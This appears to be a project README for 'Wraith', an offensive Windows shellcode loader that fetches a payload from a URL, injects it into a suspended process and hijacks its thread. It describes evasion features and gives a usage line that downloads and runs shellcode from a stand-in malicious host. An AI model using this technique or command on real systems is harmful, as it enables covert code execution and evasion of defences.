# Wraith

_Wraith_ is a minimalist thread hijacking shellcode loader for Windows, designed to be both simple and effective. By leveraging Windows API calls and thread context manipulation, Wraith enables the execution of arbitrary shellcode within a newly spawned and suspended process.

## Features

- **Dynamic Shellcode Downloading:** Fetches shellcode from a user-specified URL at runtime.
- **Thread Hijacking:** Uses context manipulation to redirect the main thread of a suspended process to the shellcode.
- **Jitter Function:** Adds random delays to evade basic behavioral analysis and slow down automated detection.
- **Minimal Dependencies:** Written in standard C using only Windows API and WinINet.
- **Stealthy Execution:** Spawns target processes in suspended mode and only resumes after the shellcode is in place.

## How It Works

1. **Shellcode Download:**  
   Wraith connects to the provided URL and downloads the shellcode into memory.

2. **Process Creation:**  
   It launches the specified target executable (e.g., `notepad.exe`) in suspended mode to avoid immediate execution.

3. **Memory Allocation:**  
   The loader allocates executable memory within the remote process and writes the downloaded shellcode into it.

4. **Thread Context Hijacking:**  
   By obtaining and modifying the main thread's context, Wraith sets the instruction pointer (RIP) to the shellcode's address.

5. **Execution:**  
   Finally, the main thread is resumed, seamlessly transferring execution to the injected shellcode.

## Usage

```bash
Wraith.exe <process_path> <shellcode_url>
```
- `<process_path>`: Path to the executable to spawn and hijack (e.g., `C:\\Windows\\System32\\notepad.exe`).
- `<shellcode_url>`: Direct URL to raw shellcode (should be downloadable as a byte stream).

**Example:**
```bash
Wraith.exe C:\Windows\System32\notepad.exe http://shellcode.mal/shellcode.bin
```

## Code Highlights

- **Jitter Function:** Random delays help break automated timing analysis.
- **WinINet Usage:** Downloads shellcode over HTTP(S), allowing for remote payload delivery.
- **Thread Context Manipulation:** Directly sets `RIP` to shellcode, a classic thread hijacking technique.

## Requirements

- Windows (x64 recommended)
- Visual Studio or MinGW for compilation
- Network connectivity for shellcode download

## Disclaimer

This project is for educational and authorized security research purposes only.  
Running this code on systems you do not own or have explicit permission to test is illegal and unethical.

## License

[MIT License](LICENSE)

---

**Wraith** — Simple. Stealthy. Effective.
